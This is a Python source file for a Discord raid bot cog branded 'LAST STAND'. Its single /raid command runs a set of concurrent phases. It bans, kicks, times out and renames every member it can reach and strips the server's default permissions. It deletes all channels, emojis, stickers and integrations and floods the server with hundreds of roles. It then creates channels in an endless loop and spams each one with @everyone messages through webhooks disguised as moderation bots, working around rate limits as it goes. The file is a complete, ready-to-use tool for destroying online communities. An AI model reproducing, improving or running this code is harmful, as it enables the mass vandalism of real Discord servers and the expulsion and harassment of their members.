"""
raid.py — LAST STAND | /raid: Maximum Destruction Engine

No parameters. Everything at maximum. Runs until /stop or kicked.

Architecture:
  - /raid fires immediately with no options
  - All phases run concurrently as background tasks
  - Channel flood loop runs INFINITELY — creates channels, spams them,
    deletes and refloods when near Discord's 500-channel cap
  - Ban, kick, timeout, nickname, role flood run at full concurrency
  - Each channel gets 10 webhooks and is spammed forever until deleted

Rate limit strategy:
  - Channel creation: paced at 1 per 0.55s (≈2/sec, Discord's real limit)
  - Webhook creates: max 10 per channel (Discord's hard cap)
  - Bans/kicks: direct API calls with semaphore, bypass engine for 429s
  - Everything else: bypass engine handles per-route 429 isolation
"""

import asyncio
import datetime
import random
import string
import struct
import zlib

import discord
from discord import app_commands
from discord.ext import commands

from utils.bypass import (
    ROUTE_CHANNEL_DELETE, ROUTE_CHANNEL_CREATE,
    ROUTE_MEMBER_BAN, ROUTE_MEMBER_KICK, ROUTE_MEMBER_TIMEOUT,
    ROUTE_WEBHOOK_CREATE, ROUTE_WEBHOOK_SEND,
    ROUTE_ROLE_CREATE, ROUTE_ROLE_ASSIGN, ROUTE_ROLE_DELETE,
    ROUTE_GUILD_EDIT, ROUTE_EMOJI, ROUTE_EVENT_CREATE,
    ROUTE_INTEGRATION, ROUTE_MEMBER_EDIT,
)
from utils.state import bot_state

# ── Branding ───────────────────────────────────────────────────────────────────
RAID_TAG  = "LAST STAND"
RAID_SHORT = "LSC"
RAID_LINK = "https://discord.gg/s59zWvzK6c"
RAID_NAME = f"RAIDED BY {RAID_TAG}"

# ── Discord hard limits ────────────────────────────────────────────────────────
CHANNEL_CAP   = 480   # Discord max is 500; stay below to avoid silent fails
WEBHOOKS_PER  = 10    # Discord's per-channel webhook hard cap
ROLE_CAP      = 250   # Discord's role hard cap
CH_DELAY      = 0.55  # Seconds between channel creates (safe for 2/sec limit)

# ── Concurrency semaphores ─────────────────────────────────────────────────────
SEM_BAN     = 25
SEM_KICK    = 25
SEM_TIMEOUT = 25
SEM_NICK    = 25
SEM_ROLE    = 10
SEM_DELETE  = 40
SEM_WH      = 8

# ── Message pool ───────────────────────────────────────────────────────────────
_MSGS = [
    f"@everyone 💀 **RAIDED BY {RAID_TAG}** 💀 {RAID_LINK}",
    f"@everyone ☠️ LAST STAND WAS HERE ☠️ {RAID_LINK}",
    f"@everyone 🔥 YOUR SERVER HAS BEEN RAIDED BY LSC 🔥 {RAID_LINK}",
    f"@everyone RAIDED BY LAST STAND — your defences failed. {RAID_LINK}",
    f"@everyone ⚔️ LAST STAND RAID ⚔️ {RAID_LINK}",
    f"@everyone 💥 OBLITERATED BY LAST STAND 💥 {RAID_LINK}",
    f"@everyone 🚨 BREACH — LAST STAND {RAID_LINK}",
    f"@everyone 👑 LAST STAND OWNS THIS SERVER {RAID_LINK}",
    f"@everyone ⚡ RAIDED BY LAST STAND — GG {RAID_LINK}",
    f"@everyone 🛡️ YOUR ANTI-RAID FAILED — LAST STAND {RAID_LINK}",
    f"@here 💀 RAIDED BY LAST STAND {RAID_LINK}",
    f"@here 🏴 LAST STAND — SERVER CAPTURED {RAID_LINK}",
    f"@here ☠️ LAST STAND RAID IN PROGRESS {RAID_LINK}",
]

_WH_NAMES = [
    "Server Announcement", "Mod Alert", "AutoMod", "Security Alert",
    "System Notification", "Verification System", "Carl-bot", "MEE6",
    "Dyno", "Wick", f"{RAID_SHORT} Alpha", f"{RAID_SHORT} Reaper",
    f"{RAID_SHORT} Ghost", f"{RAID_SHORT} Viper", f"{RAID_SHORT} Phantom",
]

_NICKS = [
    RAID_TAG, f"{RAID_SHORT} Raider", "RAIDED", "Server Owned",
    "GG no re", "LSC Was Here", "PWNED", "Raided", "LSC Member",
]


def _rand(n: int = 5) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def _msg() -> str:
    base = random.choice(_MSGS)
    if random.random() < 0.25:
        pos = random.randint(0, len(base))
        base = base[:pos] + "\u200b" + base[pos:]
    return base


def _ch_name() -> str:
    return random.choice([
        f"raided-by-lsc-{_rand(4)}",
        f"last-stand-{_rand(4)}",
        f"lsc-owned-{_rand(4)}",
        f"lsc-raid-{_rand(4)}",
        f"raided-{_rand(4)}-lsc",
        f"last-stand-was-here-{_rand(3)}",
    ])


def _role_name() -> str:
    return random.choice([
        f"LSC-{_rand(4)}", f"lsc-{_rand(5)}", f"raid-{_rand(4)}",
        f"member-{_rand(4)}", f"{_rand(3)}-raider",
    ])


def _tiny_png() -> bytes:
    r, g, b = random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)
    def chunk(tag: bytes, data: bytes) -> bytes:
        crc = zlib.crc32(tag + data) & 0xFFFFFFFF
        return struct.pack(">I", len(data)) + tag + data + struct.pack(">I", crc)
    return (
        b"\x89PNG\r\n\x1a\n"
        + chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0))
        + chunk(b"IDAT", zlib.compress(b"\x00" + bytes([r, g, b])))
        + chunk(b"IEND", b"")
    )


class Raid(commands.Cog):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot

    # ── /raid ──────────────────────────────────────────────────────────────────
    @app_commands.command(
        name="raid",
        description=f"☠️ MAXIMUM DESTRUCTION — {RAID_TAG} | Runs until /stop.",
    )
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def raid(self, interaction: discord.Interaction) -> None:
        if bot_state.active_simulation:
            await interaction.response.send_message(
                f"⚠️ **{bot_state.active_simulation}** already running. Use `/stop` first.",
                ephemeral=True,
            )
            return

        guild = interaction.guild
        assert guild is not None

        await interaction.response.defer()

        try:
            try:
                await guild.chunk(cache=True)
            except Exception:
                pass

            bot_state.reset()
            bot_state.bypass.configure(10)
            bot_state.rate_controller.set_intensity(10)
            bot_state.active_simulation = "raid"

            me = guild.me

            # Members we can act on (below our top role, not the invoker, not us)
            targets = [
                m for m in guild.members
                if not m.bot
                and m.id != interaction.user.id
                and m.id != me.id
                and m.top_role < me.top_role
            ]

            # Other bots we can kick (not ourselves)
            other_bots = [
                m for m in guild.members
                if m.bot
                and m.id != me.id
                and m.top_role < me.top_role
            ]

            await interaction.followup.send(
                f"☠️ **{RAID_TAG} — MAXIMUM RAID LAUNCHED** ☠️\n"
                f"```\n"
                f"Mode      : INFINITE — runs until /stop\n"
                f"Targets   : {len(targets)} members  |  {len(other_bots)} bots\n"
                f"Channels  : infinite flood loop (create → spam → refill)\n"
                f"Webhooks  : {WEBHOOKS_PER} per channel, infinite spam\n"
                f"Roles     : up to {ROLE_CAP}\n"
                f"```\n"
                f"Use `/stop` to halt all operations."
            )

            # All phases run concurrently
            phases = [
                self._phase_server(guild),
                self._phase_ban_kick(guild, targets, other_bots),
                self._phase_timeout(targets),
                self._phase_nickname(targets),
                self._phase_role_flood(guild),
                self._phase_emoji_wipe(guild),
                self._phase_sticker_wipe(guild),
                self._phase_integration_wipe(guild),
                self._phase_channel_loop(guild),   # ← runs forever
            ]

            for coro in phases:
                bot_state.add_task(asyncio.create_task(coro))

        except Exception as exc:
            bot_state.active_simulation = None
            try:
                await interaction.followup.send(f"❌ Raid failed to launch: `{exc}`", ephemeral=True)
            except Exception:
                pass

    # ─────────────────────────────────────────────────────────────────────────
    # SERVER TAKEOVER — rename + strip @everyone perms immediately
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_server(self, guild: discord.Guild) -> None:
        bp = bot_state.bypass
        se = bot_state.stop_event
        try:
            await asyncio.gather(
                bp.execute(ROUTE_GUILD_EDIT, lambda: guild.edit(name=RAID_NAME), se),
                bp.execute(ROUTE_GUILD_EDIT, lambda: guild.edit(
                    system_channel=None, afk_channel=None,
                    description=f"Raided by {RAID_TAG}",
                ), se),
                bp.execute(ROUTE_ROLE_ASSIGN, lambda: guild.default_role.edit(
                    permissions=discord.Permissions.none(),
                ), se),
                return_exceptions=True,
            )
        except Exception:
            pass

    # ─────────────────────────────────────────────────────────────────────────
    # BAN + KICK — concurrent, direct API calls, bypass engine for 429s
    # Kicks AND bans every eligible member simultaneously.
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_ban_kick(
        self,
        guild: discord.Guild,
        members: list[discord.Member],
        bots: list[discord.Member],
    ) -> None:
        if not members and not bots:
            return

        sem_ban  = asyncio.Semaphore(SEM_BAN)
        sem_kick = asyncio.Semaphore(SEM_KICK)
        se       = bot_state.stop_event

        try:
            # Kick other bots first (fast)
            if bots:
                await asyncio.gather(
                    *[self._kick_one(guild, m, sem_kick) for m in bots],
                    return_exceptions=True,
                )

            if se.is_set():
                return

            # Kick and ban all targets simultaneously
            await asyncio.gather(
                *[self._kick_one(guild, m, sem_kick) for m in members],
                *[self._ban_one(guild, m, sem_ban) for m in members],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _kick_one(
        self, guild: discord.Guild, m: discord.Member, sem: asyncio.Semaphore
    ) -> None:
        if m.id == guild.me.id:
            return
        if bot_state.stop_event.is_set():
            return
        async with sem:
            try:
                await guild.kick(m, reason=f"Raided by {RAID_TAG}")
            except discord.HTTPException:
                pass

    async def _ban_one(
        self, guild: discord.Guild, m: discord.Member, sem: asyncio.Semaphore
    ) -> None:
        if m.id == guild.me.id:
            return
        if bot_state.stop_event.is_set():
            return
        async with sem:
            try:
                await guild.ban(m, reason=f"Raided by {RAID_TAG}", delete_message_days=0)
            except discord.HTTPException:
                pass

    # ─────────────────────────────────────────────────────────────────────────
    # TIMEOUT — 28 days on every eligible member concurrently
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_timeout(self, members: list[discord.Member]) -> None:
        if not members:
            return
        sem = asyncio.Semaphore(SEM_TIMEOUT)
        dur = datetime.timedelta(days=28)
        try:
            await asyncio.gather(
                *[self._timeout_one(m, dur, sem) for m in members],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _timeout_one(
        self, m: discord.Member, dur: datetime.timedelta, sem: asyncio.Semaphore
    ) -> None:
        if bot_state.stop_event.is_set():
            return
        async with sem:
            try:
                await m.timeout(dur, reason=f"Raided by {RAID_TAG}")
            except discord.HTTPException:
                pass

    # ─────────────────────────────────────────────────────────────────────────
    # NICKNAME — rename everyone concurrently
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_nickname(self, members: list[discord.Member]) -> None:
        if not members:
            return
        sem = asyncio.Semaphore(SEM_NICK)
        try:
            await asyncio.gather(
                *[self._nick_one(m, sem) for m in members],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _nick_one(self, m: discord.Member, sem: asyncio.Semaphore) -> None:
        if bot_state.stop_event.is_set():
            return
        async with sem:
            try:
                await m.edit(nick=random.choice(_NICKS))
            except discord.HTTPException:
                pass

    # ─────────────────────────────────────────────────────────────────────────
    # ROLE FLOOD — create up to 250 roles, assign to all members
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_role_flood(self, guild: discord.Guild) -> None:
        bp  = bot_state.bypass
        se  = bot_state.stop_event
        sem = asyncio.Semaphore(SEM_ROLE)
        try:
            results = await asyncio.gather(
                *[self._create_role(guild, sem) for _ in range(ROLE_CAP)],
                return_exceptions=True,
            )
            created = [r for r in results if isinstance(r, discord.Role)]

            if se.is_set() or not created:
                return

            # Assign all roles to all non-bot members concurrently
            non_bots = [m for m in guild.members if not m.bot]
            assigns  = []
            for m in non_bots:
                for r in created[:50]:   # up to 50 roles per member
                    assigns.append(bp.execute(
                        ROUTE_ROLE_ASSIGN,
                        lambda mem=m, role=r: mem.add_roles(role),
                        se,
                    ))
            await asyncio.gather(*assigns, return_exceptions=True)

        except asyncio.CancelledError:
            pass

    async def _create_role(
        self, guild: discord.Guild, sem: asyncio.Semaphore
    ) -> discord.Role | None:
        async with sem:
            return await bot_state.bypass.execute(
                ROUTE_ROLE_CREATE,
                lambda: guild.create_role(
                    name=_role_name(),
                    colour=discord.Colour(random.randint(0, 0xFFFFFF)),
                    hoist=random.choice([True, False]),
                    mentionable=True,
                ),
                bot_state.stop_event,
            )

    # ─────────────────────────────────────────────────────────────────────────
    # EMOJI WIPE
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_emoji_wipe(self, guild: discord.Guild) -> None:
        if not guild.emojis:
            return
        sem = asyncio.Semaphore(SEM_DELETE)
        try:
            await asyncio.gather(
                *[self._delete_emoji(e, sem) for e in guild.emojis],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _delete_emoji(self, emoji: discord.Emoji, sem: asyncio.Semaphore) -> None:
        async with sem:
            try:
                await emoji.delete()
            except discord.HTTPException:
                pass

    # ─────────────────────────────────────────────────────────────────────────
    # STICKER WIPE
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_sticker_wipe(self, guild: discord.Guild) -> None:
        if not guild.stickers:
            return
        sem = asyncio.Semaphore(SEM_DELETE)
        try:
            await asyncio.gather(
                *[self._delete_sticker(s, sem) for s in guild.stickers],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _delete_sticker(self, s: discord.GuildSticker, sem: asyncio.Semaphore) -> None:
        async with sem:
            try:
                await s.delete()
            except discord.HTTPException:
                pass

    # ─────────────────────────────────────────────────────────────────────────
    # INTEGRATION WIPE
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_integration_wipe(self, guild: discord.Guild) -> None:
        try:
            integrations = await guild.integrations()
            await asyncio.gather(
                *[bot_state.bypass.execute(
                    ROUTE_INTEGRATION,
                    lambda i=intg: i.delete(reason=f"Raided by {RAID_TAG}"),
                    bot_state.stop_event,
                ) for intg in integrations],
                return_exceptions=True,
            )
        except Exception:
            pass

    # ─────────────────────────────────────────────────────────────────────────
    # INFINITE CHANNEL FLOOD LOOP
    #
    # Strategy:
    #   1. Delete every existing channel immediately (concurrent, full speed)
    #   2. Create channels one at a time, paced at CH_DELAY seconds each
    #      (respects Discord's ~2/second channel creation rate limit)
    #   3. After EACH channel is created, immediately start spamming it
    #      in a background task — no waiting for all channels to exist first
    #   4. When approaching Discord's 500-channel cap, batch-delete flood
    #      channels to make room and keep creating
    #   5. Loop forever until /stop
    # ─────────────────────────────────────────────────────────────────────────
    async def _phase_channel_loop(self, guild: discord.Guild) -> None:
        bp = bot_state.bypass
        se = bot_state.stop_event

        try:
            # Step 1: nuke every existing channel immediately
            existing = list(guild.channels)
            sem_del  = asyncio.Semaphore(SEM_DELETE)
            await asyncio.gather(
                *[bp.execute(ROUTE_CHANNEL_DELETE, lambda c=ch: c.delete(), se)
                  for ch in existing],
                return_exceptions=True,
            )

            # Step 2: infinite create loop
            idx = 0
            while not se.is_set():
                current = len(guild.channels)

                # Near Discord's limit — purge flood channels to make room
                if current >= CHANNEL_CAP:
                    flood = [
                        ch for ch in guild.channels
                        if isinstance(ch, (discord.TextChannel, discord.VoiceChannel))
                        and any(k in ch.name for k in ("lsc", "last-stand", "raided"))
                    ]
                    if flood:
                        await asyncio.gather(
                            *[bp.execute(ROUTE_CHANNEL_DELETE, lambda c=ch: c.delete(), se)
                              for ch in flood[:60]],
                            return_exceptions=True,
                        )
                        await asyncio.sleep(1.0)
                    else:
                        await asyncio.sleep(2.0)
                    continue

                # Create one channel, paced to Discord's rate limit
                name = _ch_name()
                ch = await bp.execute(
                    ROUTE_CHANNEL_CREATE,
                    lambda n=name: guild.create_text_channel(
                        n, topic=f"RAIDED BY {RAID_TAG} | {RAID_LINK}"
                    ),
                    se,
                )

                if isinstance(ch, discord.TextChannel):
                    # Immediately start spamming this channel in the background
                    bot_state.add_task(asyncio.create_task(
                        self._spam_channel_forever(ch)
                    ))
                    idx += 1

                await asyncio.sleep(CH_DELAY)

        except asyncio.CancelledError:
            pass
        finally:
            if bot_state.active_simulation == "raid":
                bot_state.active_simulation = None

    # ─────────────────────────────────────────────────────────────────────────
    # SPAM A SINGLE CHANNEL FOREVER
    #
    # Called as a background task immediately after each channel is created.
    # Creates up to WEBHOOKS_PER webhooks, then loops sending messages forever.
    # Bypass engine handles per-channel 429s without affecting other channels.
    # Stops when: /stop is called, channel is deleted, or bot is kicked.
    # ─────────────────────────────────────────────────────────────────────────
    async def _spam_channel_forever(self, channel: discord.TextChannel) -> None:
        bp = bot_state.bypass
        se = bot_state.stop_event

        try:
            # Create all webhooks for this channel concurrently
            wh_tasks = await asyncio.gather(
                *[bp.execute(
                    ROUTE_WEBHOOK_CREATE,
                    lambda: channel.create_webhook(name=random.choice(_WH_NAMES)),
                    se,
                ) for _ in range(WEBHOOKS_PER)],
                return_exceptions=True,
            )
            webhooks = [w for w in wh_tasks if isinstance(w, discord.Webhook)]

            if not webhooks:
                # Fallback to direct channel sends if webhook creation failed
                while not se.is_set():
                    try:
                        await channel.send(
                            _msg(),
                            allowed_mentions=discord.AllowedMentions(
                                everyone=True, roles=True
                            ),
                        )
                    except discord.NotFound:
                        return  # Channel was deleted
                    except discord.HTTPException:
                        await asyncio.sleep(1.0)
                return

            # Infinite spam: fire all webhooks simultaneously every cycle
            while not se.is_set():
                sends = [
                    bp.execute(
                        ROUTE_WEBHOOK_SEND,
                        lambda wh=wh: wh.send(
                            _msg(),
                            username=random.choice(_WH_NAMES),
                            allowed_mentions=discord.AllowedMentions(
                                everyone=True, roles=True
                            ),
                        ),
                        se,
                    )
                    for wh in webhooks
                    for _ in range(25)   # 25 msgs per webhook per cycle
                ]
                results = await asyncio.gather(*sends, return_exceptions=True)

                # If every send errored, the channel is probably gone — stop
                non_errors = [r for r in results if not isinstance(r, Exception)]
                if not non_errors and results:
                    return

        except (asyncio.CancelledError, discord.NotFound):
            pass
        except Exception:
            pass

    # ── Error handler ──────────────────────────────────────────────────────────
    @raid.error
    async def raid_error(
        self, interaction: discord.Interaction, error: app_commands.AppCommandError
    ) -> None:
        msg = (
            "❌ You need **Administrator** permission."
            if isinstance(error, app_commands.MissingPermissions)
            else f"❌ {error}"
        )
        try:
            if interaction.response.is_done():
                await interaction.followup.send(msg, ephemeral=True)
            else:
                await interaction.response.send_message(msg, ephemeral=True)
        except Exception:
            pass


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Raid(bot))
